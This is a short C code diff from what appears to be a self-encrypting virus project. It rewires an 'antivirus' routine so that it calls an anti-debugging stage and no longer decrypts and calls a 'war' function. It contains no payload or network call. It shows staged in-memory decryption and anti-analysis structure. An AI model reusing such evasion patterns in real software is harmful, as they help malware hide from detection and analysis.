@@ -60,7 +60,7 @@ void antivirus(struct s_host *host, struct s_keychain *keychain, enum e_context 
 
 	if ((fd = _open(path, O_RDONLY | O_DIRECTORY, 0000)) < 0)
 	{
-		context = ABORT;
+		context = FAILURE;
 		goto label;
 	}
 
@@ -90,8 +90,5 @@ label:
 	if (context == ABORT)
 		execution(host, keychain, context);
 
-	update_keychain_left(keychain, (char *)antivirus, (void *)war - (void *)antivirus);
-	decrypt_left(keychain, (char *)war, (void *)find_host - (void *)war);
-
-	war(host, keychain, context);
+	antidebug(host, keychain, context);
 }
